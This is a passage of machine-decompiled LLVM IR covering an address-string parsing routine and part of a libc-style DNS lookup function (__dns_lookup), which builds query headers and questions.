  %v0_8055c6d33 = phi i32 [ 0, %dec_label_pc_8055bfb ], [ %v2_8055c55, %dec_label_pc_8055c4f ]
  %v1_8055c06 = inttoptr i32 %v0_8055c0634 to i8*
  %v2_8055c06 = load i8, i8* %v1_8055c06, align 1
  %v3_8055c06 = sext i8 %v2_8055c06 to i32
  %v2_8055c0f = mul nsw i32 %v3_8055c06, 2
  %v3_8055c0f = add i32 %v2_8055c0f, %v0_8055c09.pre
  %v4_8055c0f = inttoptr i32 %v3_8055c0f to i8*
  %v5_8055c0f = load i8, i8* %v4_8055c0f, align 1
  %v6_8055c0f = and i8 %v5_8055c0f, 8
  %v7_8055c0f = icmp eq i8 %v6_8055c0f, 0
  br i1 %v7_8055c0f, label %dec_label_pc_8055c78, label %dec_label_pc_8055c16

dec_label_pc_8055c16:                             ; preds = %dec_label_pc_8055c06
  %v4_8055c2a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055c2a

dec_label_pc_8055c1a:                             ; preds = %dec_label_pc_8055c2a
  %v3_8055c1a = mul i32 %v1_8055c1a, 10
  %v2_8055c1d = add i32 %v3_8055c1a, -48
  %v3_8055c1d = add i32 %v2_8055c1d, %v2_8055c2c
  %v1_8055c21 = add i32 %v3_8055c1d, -255
  %v6_8055c21 = sub i32 254, %v3_8055c1d
  %v7_8055c21 = and i32 %v6_8055c21, %v3_8055c1d
  %v8_8055c21 = icmp slt i32 %v7_8055c21, 0
  %v9_8055c21 = icmp eq i32 %v1_8055c21, 0
  %v10_8055c21 = icmp slt i32 %v1_8055c21, 0
  %v3_8055c27 = icmp eq i1 %v10_8055c21, %v8_8055c21
  %v4_8055c27 = icmp eq i1 %v9_8055c21, false
  %v5_8055c27 = and i1 %v4_8055c27, %v3_8055c27
  br i1 %v5_8055c27, label %dec_label_pc_8055c78, label %dec_label_pc_8055c29

dec_label_pc_8055c29:                             ; preds = %dec_label_pc_8055c1a
  %v1_8055c29 = add i32 %v0_8055c29, 1
  store i32 %v1_8055c29, i32* @ecx, align 4
  br label %dec_label_pc_8055c2a

dec_label_pc_8055c2a:                             ; preds = %dec_label_pc_8055c16, %dec_label_pc_8055c29
  %v1_8055c1a = phi i32 [ 0, %dec_label_pc_8055c16 ], [ %v3_8055c1d, %dec_label_pc_8055c29 ]
  %v4_8055c2a = phi i32 [ %v4_8055c2a.pre, %dec_label_pc_8055c16 ], [ %v6_8055c2a, %dec_label_pc_8055c29 ]
  %v0_8055c29 = phi i32 [ %v0_8055c0634, %dec_label_pc_8055c16 ], [ %v1_8055c29, %dec_label_pc_8055c29 ]
  %v1_8055c2a = inttoptr i32 %v0_8055c29 to i8*
  %v2_8055c2a = load i8, i8* %v1_8055c2a, align 1
  %v3_8055c2a = zext i8 %v2_8055c2a to i32
  %v5_8055c2a = and i32 %v4_8055c2a, -256
  %v6_8055c2a = or i32 %v3_8055c2a, %v5_8055c2a
  store i32 %v6_8055c2a, i32* @edx, align 4
  %v2_8055c2c = sext i8 %v2_8055c2a to i32
  %v2_8055c2f = mul nsw i32 %v2_8055c2c, 2
  %v3_8055c2f = add i32 %v2_8055c2f, %v0_8055c09.pre
  %v4_8055c2f = inttoptr i32 %v3_8055c2f to i16*
  %v5_8055c2f = load i16, i16* %v4_8055c2f, align 2
  %v2_8055c34 = and i16 %v5_8055c2f, 8
  %v3_8055c34 = icmp eq i16 %v2_8055c34, 0
  %v1_8055c36 = icmp eq i1 %v3_8055c34, false
  br i1 %v1_8055c36, label %dec_label_pc_8055c1a, label %dec_label_pc_8055c38

dec_label_pc_8055c38:                             ; preds = %dec_label_pc_8055c2a
  %v8_8055c38 = sub nsw i32 2, %v2_8055c5235
  %v9_8055c38 = and i32 %v8_8055c38, %v2_8055c5235
  %v10_8055c38 = icmp slt i32 %v9_8055c38, 0
  %v11_8055c38 = icmp eq i32 %v2_8055c5235, 3
  %v12_8055c38 = icmp slt i32 %v2_8055c5235, 3
  %v3_8055c3c = icmp eq i1 %v12_8055c38, %v10_8055c38
  %v4_8055c3c = icmp eq i1 %v11_8055c38, false
  %v5_8055c3c = and i1 %v4_8055c3c, %v3_8055c3c
  br i1 %v5_8055c3c, label %dec_label_pc_8055c46, label %dec_label_pc_8055c3e

dec_label_pc_8055c3e:                             ; preds = %dec_label_pc_8055c38
  %v10_8055c3e = icmp eq i8 %v2_8055c2a, 46
  %v1_8055c41 = icmp eq i1 %v10_8055c3e, false
  br i1 %v1_8055c41, label %dec_label_pc_8055c78, label %dec_label_pc_8055c43

dec_label_pc_8055c43:                             ; preds = %dec_label_pc_8055c3e
  %v1_8055c43 = add i32 %v0_8055c29, 1
  store i32 %v1_8055c43, i32* @ecx, align 4
  br label %dec_label_pc_8055c4f

dec_label_pc_8055c46:                             ; preds = %dec_label_pc_8055c38
  %v1_8055c46 = add i32 %v0_8055c29, 1
  store i32 %v1_8055c46, i32* @ecx, align 4
  %v4_8055c47 = icmp eq i8 %v2_8055c2a, 0
  br i1 %v4_8055c47, label %dec_label_pc_8055c4f, label %dec_label_pc_8055c4b

dec_label_pc_8055c4b:                             ; preds = %dec_label_pc_8055c46
  %v2_8055c4b = and i16 %v5_8055c2f, 32
  %v3_8055c4b = icmp eq i16 %v2_8055c4b, 0
  br i1 %v3_8055c4b, label %dec_label_pc_8055c78, label %dec_label_pc_8055c4f

dec_label_pc_8055c4f:                             ; preds = %dec_label_pc_8055c4b, %dec_label_pc_8055c46, %dec_label_pc_8055c43
  %v0_8055c063 = phi i32 [ %v1_8055c46, %dec_label_pc_8055c4b ], [ %v1_8055c46, %dec_label_pc_8055c46 ], [ %v1_8055c43, %dec_label_pc_8055c43 ]
  %v2_8055c4f = mul i32 %v0_8055c6d33, 256
  %v3_8055c52 = add nuw nsw i32 %v2_8055c5235, 1
  %v2_8055c55 = or i32 %v1_8055c1a, %v2_8055c4f
  %v7_8055c5b = icmp sgt i32 %v2_8055c5235, 3
  br i1 %v7_8055c5b, label %dec_label_pc_8055c5d, label %dec_label_pc_8055c06

dec_label_pc_8055c5d:                             ; preds = %dec_label_pc_8055c4f
  %v4_8055c62 = icmp eq i32 %arg2, 0
  br i1 %v4_8055c62, label %dec_label_pc_8055c7a, label %dec_label_pc_8055c69

dec_label_pc_8055c69:                             ; preds = %dec_label_pc_8055c5d
  %v1_8055c6d = call i32 @llvm.bswap.i32(i32 %v2_8055c55)
  %v2_8055c6f = inttoptr i32 %arg2 to i32*
  store i32 %v1_8055c6d, i32* %v2_8055c6f, align 4
  br label %dec_label_pc_8055c7a

dec_label_pc_8055c78:                             ; preds = %dec_label_pc_8055c4b, %dec_label_pc_8055c3e, %dec_label_pc_8055c06, %dec_label_pc_8055c1a, %entry
  br label %dec_label_pc_8055c7a

dec_label_pc_8055c7a:                             ; preds = %dec_label_pc_8055c5d, %dec_label_pc_8055c69, %dec_label_pc_8055c78
  %v0_8055c7f = phi i32 [ 1, %dec_label_pc_8055c5d ], [ 1, %dec_label_pc_8055c69 ], [ 0, %dec_label_pc_8055c78 ]
  ret i32 %v0_8055c7f

; uselistorder directives
  uselistorder i32 %v2_8055c2c, { 1, 0 }
  uselistorder i32 %v6_8055c2a, { 1, 0 }
  uselistorder i8 %v2_8055c2a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055c29, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8055c21, { 1, 0 }
  uselistorder i32 %v3_8055c1d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8055c0634, { 1, 0 }
  uselistorder i32 %v2_8055c5235, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055c7a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055c78, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8055c2a, { 1, 0 }
  uselistorder label %dec_label_pc_8055c06, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8055c96 = call i32 @malloc(i32 512)
  store i32 %v2_8055c96, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8055c96, i32* @ebp, align 4
  %v2_8055ca4 = call i32 @malloc(i32 1025)
  store i32 %v2_8055ca4, i32* %eax.global-to-local, align 4
  %v12_8055cad = ptrtoint i32* %stack_var_-236 to i32
  %v1_8055cb0 = icmp eq i32 %v2_8055c96, 0
  br i1 %v1_8055cb0, label %dec_label_pc_8056329, label %dec_label_pc_8055cb8

dec_label_pc_8055cb8:                             ; preds = %entry
  %v1_8055cb8 = icmp eq i32 %v2_8055ca4, 0
  br i1 %v1_8055cb8, label %dec_label_pc_8056329, label %dec_label_pc_8055cc0

dec_label_pc_8055cc0:                             ; preds = %dec_label_pc_8055cb8
  %v5_8055cc0 = icmp eq i32 %arg2, 0
  br i1 %v5_8055cc0, label %dec_label_pc_8056329, label %dec_label_pc_8055cce

dec_label_pc_8055cce:                             ; preds = %dec_label_pc_8055cc0
  %v4_8055cce = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055cce, i32* %eax.global-to-local, align 4
  %v2_8055cd5 = load i8, i8* %arg1, align 1
  %v3_8055cd5 = icmp eq i8 %v2_8055cd5, 0
  br i1 %v3_8055cd5, label %dec_label_pc_8056329, label %dec_label_pc_8055cde

dec_label_pc_8055cde:                             ; preds = %dec_label_pc_8055cce
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8055ce2 = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8055ce2, i32* @eax, align 4
  store i32 %v4_8055cce, i32* %edx.global-to-local, align 4
  %v2_8055d05 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8055d05, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8055d0d = call i32 @__pthread_return_void(i32 %v2_8055d05, i32 134564427)
  store i32 %v3_8055d0d, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8065b28.1015 to i8*), i8** %stack_var_-252, align 4
  %v2_8055d19 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8065b28.1015 to i32))
  %v0_8055d1e = load i64, i64* @global_var_8065b40.1016, align 8
  %v1_8055d1e = trunc i64 %v0_8055d1e to i32
  %v1_8055d23 = ashr i32 %v1_8055d1e, 31
  %v6_8055d24 = and i64 %v0_8055d1e, 4294967295
  %v8_8055d24 = zext i32 %v1_8055d23 to i64
  %v9_8055d24 = mul nuw i64 %v8_8055d24, 4294967296
  %v10_8055d24 = or i64 %v9_8055d24, %v6_8055d24
  %v14_8055d24 = srem i64 %v10_8055d24, %tmp33
  %v15_8055d24 = trunc i64 %v14_8055d24 to i32
  %v0_8055d2b = load i16, i16* @global_var_805f884.1017, align 4
  %v2_8055d3a = load i8*, i8** %stack_var_-252, align 4
  %v3_8055d3a = ptrtoint i8* %v2_8055d3a to i32
  store i32 %v3_8055d3a, i32* @eax, align 4
  store i32 134564427, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8055d3f = call i32 @__pthread_return_void(i32 %v2_8055d05, i32 1)
  store i32 %v3_8055d3f, i32* %eax.global-to-local, align 4
  %v3_8055d83 = sext i16 %v0_8055d2b to i32
  %v5_8055ee6 = inttoptr i32 %v15_8055d24 to i8*
  %v1_805630487 = add i32 %v12_8055cad, 28
  %v2_805630488 = inttoptr i32 %v1_805630487 to i32*
  %v3_805630489 = load i32, i32* %v2_805630488, align 4
  %tmp119 = icmp ult i32 %v3_805630489, 3
  br i1 %tmp119, label %dec_label_pc_8055d64, label %dec_label_pc_8056329

dec_label_pc_8055d64:                             ; preds = %dec_label_pc_8055cde, %dec_label_pc_8056304.backedge
  %v0_8055d6b92 = phi i32 [ %v0_8056304.pre, %dec_label_pc_8056304.backedge ], [ %v12_8055cad, %dec_label_pc_8055cde ]
  %v1_8055d64 = add i32 %v0_8055d6b92, 20
  %v2_8055d64 = inttoptr i32 %v1_8055d64 to i32*
  %v3_8055d64 = load i32, i32* %v2_8055d64, align 4
  %v13_8055d64 = icmp eq i32 %v3_8055d64, -1
  br i1 %v13_8055d64, label %dec_label_pc_8055d64.dec_label_pc_8055d7a_crit_edge, label %dec_label_pc_8055d6b

dec_label_pc_8055d64.dec_label_pc_8055d7a_crit_edge: ; preds = %dec_label_pc_8055d64
  %v0_8055d7a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055d7a

dec_label_pc_8055d6b:                             ; preds = %dec_label_pc_8055d64
  %v3_8055d6e = load i32, i32* %v2_8055d64, align 4
  %v5_8055d6e = add i32 %v0_8055d6b92, -16
  %v6_8055d6e = inttoptr i32 %v5_8055d6e to i32*
  store i32 %v3_8055d6e, i32* %v6_8055d6e, align 4
  %v1_8055d72 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8055d72, i32* %eax.global-to-local, align 4
  %v0_8055d77 = load i32, i32* @esp, align 4
  %v1_8055d77 = add i32 %v0_8055d77, 16
  br label %dec_label_pc_8055d7a

dec_label_pc_8055d7a:                             ; preds = %dec_label_pc_8055d64.dec_label_pc_8055d7a_crit_edge, %dec_label_pc_8055d6b
  %v1_8055d7a = phi i32 [ %v0_8055d6b92, %dec_label_pc_8055d64.dec_label_pc_8055d7a_crit_edge ], [ %v1_8055d77, %dec_label_pc_8055d6b ]
  %v0_8055d7a = phi i32 [ %v0_8055d7a.pre, %dec_label_pc_8055d64.dec_label_pc_8055d7a_crit_edge ], [ %v1_8055d72, %dec_label_pc_8055d6b ]
  %v2_8055d7a = add i32 %v1_8055d7a, -4
  %v3_8055d7a = inttoptr i32 %v2_8055d7a to i32*
  store i32 %v0_8055d7a, i32* %v3_8055d7a, align 4
  %v1_8055d7b = add i32 %v1_8055d7a, -8
  %v2_8055d7b = inttoptr i32 %v1_8055d7b to i32*
  store i32 512, i32* %v2_8055d7b, align 4
  %v1_8055d80 = add i32 %v1_8055d7a, -12
  %v2_8055d80 = inttoptr i32 %v1_8055d80 to i32*
  store i32 0, i32* %v2_8055d80, align 4
  %v2_8055d82 = add i32 %v1_8055d7a, -16
  %v3_8055d82 = inttoptr i32 %v2_8055d82 to i32*
  store i32 %v2_8055c96, i32* %v3_8055d82, align 4
  %v5_8055d83 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055d24, i32 %v3_8055d83)
  store i32 %v5_8055d83, i32* %eax.global-to-local, align 4
  %v0_8055d88 = load i32, i32* @esp, align 4
  %v1_8055d8b = add i32 %v0_8055d88, 8
  %v2_8055d8b = inttoptr i32 %v1_8055d8b to i32*
  store i32 48, i32* %v2_8055d8b, align 4
  %v1_8055d8d = add i32 %v0_8055d88, 4
  %v2_8055d8d = inttoptr i32 %v1_8055d8d to i32*
  store i32 0, i32* %v2_8055d8d, align 4
  %v1_8055d8f = add i32 %v0_8055d88, 84
  store i32 %v1_8055d8f, i32* @ebx, align 4
  %v3_8055d93 = inttoptr i32 %v0_8055d88 to i32*
  store i32 %v1_8055d8f, i32* %v3_8055d93, align 4
  %v5_8055d94 = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055d24, i32 %v3_8055d83)
  store i32 %v5_8055d94, i32* %eax.global-to-local, align 4
  %v0_8055d99 = load i32, i32* @esp, align 4
  %v1_8055d99 = add i32 %v0_8055d99, 60
  %v2_8055d99 = inttoptr i32 %v1_8055d99 to i32*
  %v3_8055d99 = load i32, i32* %v2_8055d99, align 4
  store i32 %v3_8055d99, i32* %eax.global-to-local, align 4
  %v1_8055d9d = add i32 %v0_8055d99, 116
  %v2_8055d9d = inttoptr i32 %v1_8055d9d to i32*
  store i32 1, i32* %v2_8055d9d, align 4
  %v0_8055da5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055da5 = add i32 %v0_8055da5, 1
  %v0_8055da6 = load i32, i32* @esp, align 4
  %v1_8055da6 = add i32 %v0_8055da6, 104
  %v2_8055da6 = inttoptr i32 %v1_8055da6 to i32*
  store i32 1, i32* %v2_8055da6, align 4
  %v1_8055dae = urem i32 %v1_8055da5, 65536
  store i32 %v1_8055dae, i32* %eax.global-to-local, align 4
  %v1_8055db3 = load i32, i32* @esp, align 4
  %v2_8055db3 = add i32 %v1_8055db3, 60
  %v3_8055db3 = inttoptr i32 %v2_8055db3 to i32*
  store i32 %v1_8055dae, i32* %v3_8055db3, align 4
  %v0_8055db7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055db7 = load i32, i32* @esp, align 4
  %v2_8055db7 = add i32 %v1_8055db7, 84
  %v3_8055db7 = inttoptr i32 %v2_8055db7 to i32*
  store i32 %v0_8055db7, i32* %v3_8055db7, align 4
  %v0_8055dbb = load i32, i32* @esp, align 4
  %v1_8055dbe = add i32 %v0_8055dbb, 8
  %v2_8055dbe = inttoptr i32 %v1_8055dbe to i32*
  store i32 512, i32* %v2_8055dbe, align 4
  %v2_8055dc3 = add i32 %v0_8055dbb, 4
  %v3_8055dc3 = inttoptr i32 %v2_8055dc3 to i32*
  store i32 %v2_8055c96, i32* %v3_8055dc3, align 4
  %v0_8055dc4 = load i32, i32* @ebx, align 4
  %v3_8055dc4 = inttoptr i32 %v0_8055dbb to i32*
  store i32 %v0_8055dc4, i32* %v3_8055dc4, align 4
  %v0_8055dc5 = call i32 @__encode_header()
  store i32 %v0_8055dc5, i32* %eax.global-to-local, align 4
  %v0_8055dca = load i32, i32* @esp, align 4
  store i32 %v0_8055dc5, i32* @ebx, align 4
  %v2_8055dcf = icmp slt i32 %v0_8055dc5, 0
  br i1 %v2_8055dcf, label %dec_label_pc_8056329, label %dec_label_pc_8055dd7

dec_label_pc_8055dd7:                             ; preds = %dec_label_pc_8055d7a
  %v2_8055dd7 = add i32 %v0_8055dca, 12
  %v3_8055dd7 = inttoptr i32 %v2_8055dd7 to i32*
  store i32 %v0_8055dc5, i32* %v3_8055dd7, align 4
  %v1_8055dd8 = add i32 %v0_8055dca, 8
  %v2_8055dd8 = inttoptr i32 %v1_8055dd8 to i32*
  store i32 1025, i32* %v2_8055dd8, align 4
  %v1_8055ddd = add i32 %v0_8055dca, 256
  %v2_8055ddd = inttoptr i32 %v1_8055ddd to i32*
  %v3_8055ddd = load i32, i32* %v2_8055ddd, align 4
  %v5_8055ddd = add i32 %v0_8055dca, 4
  %v6_8055ddd = inttoptr i32 %v5_8055ddd to i32*
  store i32 %v3_8055ddd, i32* %v6_8055ddd, align 4
  %v1_8055de4 = add i32 %v0_8055dca, 28
  %v2_8055de4 = inttoptr i32 %v1_8055de4 to i32*
  %v3_8055de4 = load i32, i32* %v2_8055de4, align 4
  %v6_8055de4 = inttoptr i32 %v0_8055dca to i32*
  store i32 %v3_8055de4, i32* %v6_8055de4, align 4
  %v5_8055de8 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8055d24, i32 %v3_8055d83)
  %v0_8055ded = load i32, i32* @esp, align 4
  %v1_8055df0 = add i32 %v0_8055ded, 8
  %v2_8055df0 = inttoptr i32 %v1_8055df0 to i32*
  store i32 ptrtoint (i32* @global_var_805f888.953 to i32), i32* %v2_8055df0, align 4
  %v1_8055df5 = add i32 %v0_8055ded, 4
  %v2_8055df5 = inttoptr i32 %v1_8055df5 to i32*
  store i32 134564427, i32* %v2_8055df5, align 4
  %v1_8055dfa = add i32 %v0_8055ded, 200
  store i32 %v1_8055dfa, i32* @eax, align 4
  %v3_8055e01 = inttoptr i32 %v0_8055ded to i32*
  store i32 %v1_8055dfa, i32* %v3_8055e01, align 4
  %v2_8055e02 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d24)
  store i32 %v2_8055e02, i32* %eax.global-to-local, align 4
  %v0_8055e07 = load i32, i32* @esp, align 4
  %v1_8055e07 = inttoptr i32 %v0_8055e07 to i32*
  store i32 ptrtoint (i32* @global_var_805f888.953 to i32), i32* %v1_8055e07, align 4
  %v1_8055e0e = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055e0e, i32* %eax.global-to-local, align 4
  %v0_8055e13 = load i32, i32* @esp, align 4
  %v1_8055e13 = add i32 %v0_8055e13, 56
  %v2_8055e13 = inttoptr i32 %v1_8055e13 to i32*
  %v3_8055e13 = load i32, i32* %v2_8055e13, align 4
  store i32 %v3_8055e13, i32* %edx.global-to-local, align 4
  %v1_8055e17 = add i32 %v0_8055e13, 268
  %v2_8055e17 = inttoptr i32 %v1_8055e17 to i32*
  %v3_8055e17 = load i32, i32* %v2_8055e17, align 4
  store i32 %v3_8055e17, i32* %eax.global-to-local, align 4
  %v2_8055e1e = mul i32 %v3_8055e13, 4
  %v3_8055e1e = add i32 %v3_8055e17, %v2_8055e1e
  %v4_8055e1e = inttoptr i32 %v3_8055e1e to i32*
  %v5_8055e1e = load i32, i32* %v4_8055e1e, align 4
  store i32 %v5_8055e1e, i32* %edx.global-to-local, align 4
  %v2_8055e21 = add i32 %v0_8055e13, 48
  %v3_8055e21 = inttoptr i32 %v2_8055e21 to i32*
  store i32 %v5_8055e1e, i32* %v3_8055e21, align 4
  %v0_8055e25 = load i32, i32* @esp, align 4
  %v1_8055e25 = add i32 %v0_8055e25, 16
  %v1_8055e28 = add i32 %v0_8055e25, 52
  %v2_8055e28 = inttoptr i32 %v1_8055e28 to i32*
  %v3_8055e28 = load i32, i32* %v2_8055e28, align 4
  %v5_8055e28 = icmp slt i32 %v3_8055e28, 0
  br i1 %v5_8055e28, label %dec_label_pc_8055dd7.dec_label_pc_8055e6e_crit_edge, label %dec_label_pc_8055e2f

dec_label_pc_8055dd7.dec_label_pc_8055e6e_crit_edge: ; preds = %dec_label_pc_8055dd7
  %v0_8055e6e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055e6e

dec_label_pc_8055e2f:                             ; preds = %dec_label_pc_8055dd7
  store i32 %v3_8055e28, i32* %eax.global-to-local, align 4
  %v1_8055e33 = load i32, i32* @global_var_8065f78.1018, align 8
  %v2_8055e33 = sub i32 %v3_8055e28, %v1_8055e33
  %v8_8055e33 = xor i32 %v1_8055e33, %v3_8055e28
  %v9_8055e33 = xor i32 %v2_8055e33, %v3_8055e28
  %v10_8055e33 = and i32 %v9_8055e33, %v8_8055e33
  %v11_8055e33 = icmp slt i32 %v10_8055e33, 0
  %v13_8055e33 = icmp slt i32 %v2_8055e33, 0
  %v2_8055e39 = icmp eq i1 %v13_8055e33, %v11_8055e33
  br i1 %v2_8055e39, label %dec_label_pc_8055e6e, label %dec_label_pc_8055e3b

dec_label_pc_8055e3b:                             ; preds = %dec_label_pc_8055e2f
  %v2_8055e3b = add i32 %v0_8055e25, 12
  %v3_8055e3b = inttoptr i32 %v2_8055e3b to i32*
  store i32 %v3_8055e28, i32* %v3_8055e3b, align 4
  %v1_8055e3c = add i32 %v0_8055e25, 8
  %v2_8055e3c = inttoptr i32 %v1_8055e3c to i32*
  store i32 1025, i32* %v2_8055e3c, align 4
  %v1_8055e41 = add i32 %v0_8055e25, 4
  %v2_8055e41 = inttoptr i32 %v1_8055e41 to i32*
  store i32 ptrtoint (i32* @global_var_805e33c.1019 to i32), i32* %v2_8055e41, align 4
  %v1_8055e46 = add i32 %v0_8055e25, 28
  %v2_8055e46 = inttoptr i32 %v1_8055e46 to i32*
  %v3_8055e46 = load i32, i32* %v2_8055e46, align 4
  %v6_8055e46 = inttoptr i32 %v0_8055e25 to i32*
  store i32 %v3_8055e46, i32* %v6_8055e46, align 4
  %v0_8055e4a = call i32 @__GI_strncat()
  store i32 %v0_8055e4a, i32* %eax.global-to-local, align 4
  %v0_8055e4f = load i32, i32* @esp, align 4
  %v1_8055e52 = add i32 %v0_8055e4f, 8
  %v2_8055e52 = inttoptr i32 %v1_8055e52 to i32*
  store i32 1025, i32* %v2_8055e52, align 4
  %v1_8055e57 = add i32 %v0_8055e4f, 52
  %v2_8055e57 = inttoptr i32 %v1_8055e57 to i32*
  %v3_8055e57 = load i32, i32* %v2_8055e57, align 4
  store i32 %v3_8055e57, i32* %edx.global-to-local, align 4
  %v1_8055e5b = mul i32 %v3_8055e57, 4
  %v2_8055e5b = add i32 %v1_8055e5b, 134635352
  %v3_8055e5b = inttoptr i32 %v2_8055e5b to i32*
  %v4_8055e5b = load i32, i32* %v3_8055e5b, align 4
  %v6_8055e5b = add i32 %v0_8055e4f, 4
  %v7_8055e5b = inttoptr i32 %v6_8055e5b to i32*
  store i32 %v4_8055e5b, i32* %v7_8055e5b, align 4
  %v1_8055e62 = add i32 %v0_8055e4f, 28
  %v2_8055e62 = inttoptr i32 %v1_8055e62 to i32*
  %v3_8055e62 = load i32, i32* %v2_8055e62, align 4
  %v6_8055e62 = inttoptr i32 %v0_8055e4f to i32*
  store i32 %v3_8055e62, i32* %v6_8055e62, align 4
  %v0_8055e66 = call i32 @__GI_strncat()
  store i32 %v0_8055e66, i32* %eax.global-to-local, align 4
  %v0_8055e6b = load i32, i32* @esp, align 4
  %v1_8055e6b = add i32 %v0_8055e6b, 16
  br label %dec_label_pc_8055e6e

dec_label_pc_8055e6e:                             ; preds = %dec_label_pc_8055dd7.dec_label_pc_8055e6e_crit_edge, %dec_label_pc_8055e2f, %dec_label_pc_8055e3b
  %v1_8055e6e = phi i32 [ %v1_8055e25, %dec_label_pc_8055dd7.dec_label_pc_8055e6e_crit_edge ], [ %v1_8055e25, %dec_label_pc_8055e2f ], [ %v1_8055e6b, %dec_label_pc_8055e3b ]
  %v0_8055e6e = phi i32 [ %v0_8055e6e.pre, %dec_label_pc_8055dd7.dec_label_pc_8055e6e_crit_edge ], [ %v3_8055e28, %dec_label_pc_8055e2f ], [ %v0_8055e66, %dec_label_pc_8055e3b ]
  %v2_8055e6e = add i32 %v1_8055e6e, -4
  %v3_8055e6e = inttoptr i32 %v2_8055e6e to i32*
  store i32 %v0_8055e6e, i32* %v3_8055e6e, align 4
  %v0_8055e6f = load i32, i32* %eax.global-to-local, align 4
  %v2_8055e6f = add i32 %v1_8055e6e, -8
  %v3_8055e6f = inttoptr i32 %v2_8055e6f to i32*
  store i32 %v0_8055e6f, i32* %v3_8055e6f, align 4
  %v1_8055e70 = add i32 %v1_8055e6e, -12
  %v2_8055e70 = inttoptr i32 %v1_8055e70 to i32*
  store i32 1, i32* %v2_8055e70, align 4
  %v1_8055e72 = add i32 %v1_8055e6e, 184
  store i32 %v1_8055e72, i32* @eax, align 4
  %v2_8055e79 = add i32 %v1_8055e6e, -16
  %v3_8055e79 = inttoptr i32 %v2_8055e79 to i32*
  store i32 %v1_8055e72, i32* %v3_8055e79, align 4
  %v2_8055e7a = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d24)
  store i32 %v2_8055e7a, i32* %eax.global-to-local, align 4
  %v0_8055e7f = load i32, i32* @esp, align 4
  %v1_8055e7f = add i32 %v0_8055e7f, 28
  %v2_8055e7f = inttoptr i32 %v1_8055e7f to i32*
  %v3_8055e7f = load i32, i32* %v2_8055e7f, align 4
  store i32 %v3_8055e7f, i32* %eax.global-to-local, align 4
  %v1_8055e83 = add i32 %v0_8055e7f, 260
  %v2_8055e83 = inttoptr i32 %v1_8055e83 to i32*
  %v3_8055e83 = load i32, i32* %v2_8055e83, align 4
  store i32 %v3_8055e83, i32* @edx, align 4
  %v2_8055e8a = add i32 %v0_8055e7f, 216
  %v3_8055e8a = inttoptr i32 %v2_8055e8a to i32*
  store i32 %v3_8055e7f, i32* %v3_8055e8a, align 4
  %v0_8055e91 = load i32, i32* @edx, align 4
  %v1_8055e91 = load i32, i32* @esp, align 4
  %v2_8055e91 = add i32 %v1_8055e91, 220
  %v3_8055e91 = inttoptr i32 %v2_8055e91 to i32*
  store i32 %v0_8055e91, i32* %v3_8055e91, align 4
  %v0_8055e98 = load i32, i32* @esp, align 4
  %v1_8055e98 = add i32 %v0_8055e98, 224
  %v2_8055e98 = inttoptr i32 %v1_8055e98 to i32*
  store i32 1, i32* %v2_8055e98, align 4
  %v0_8055ea8 = load i32, i32* @esp, align 4
  %v1_8055eab = load i32, i32* @ebx, align 4
  %v2_8055eab = sub i32 512, %v1_8055eab
  %v2_8055ead = add i32 %v0_8055ea8, 8
  %v3_8055ead = inttoptr i32 %v2_8055ead to i32*
  store i32 %v2_8055eab, i32* %v3_8055ead, align 4
  %v1_8055eae = load i32, i32* @ebx, align 4
  %v2_8055eae = add i32 %v1_8055eae, %v2_8055c96
  %v2_8055eb2 = add i32 %v0_8055ea8, 4
  %v3_8055eb2 = inttoptr i32 %v2_8055eb2 to i32*
  store i32 %v2_8055eae, i32* %v3_8055eb2, align 4
  %v1_8055eb3 = add i32 %v0_8055ea8, 216
  store i32 %v1_8055eb3, i32* @eax, align 4
  %v3_8055eba = inttoptr i32 %v0_8055ea8 to i32*
  store i32 %v1_8055eb3, i32* %v3_8055eba, align 4
  %v0_8055ebb = call i32 @__encode_question()
  store i32 %v0_8055ebb, i32* %eax.global-to-local, align 4
  %v0_8055ec0 = load i32, i32* @esp, align 4
  store i32 %v0_8055ebb, i32* @esi, align 4
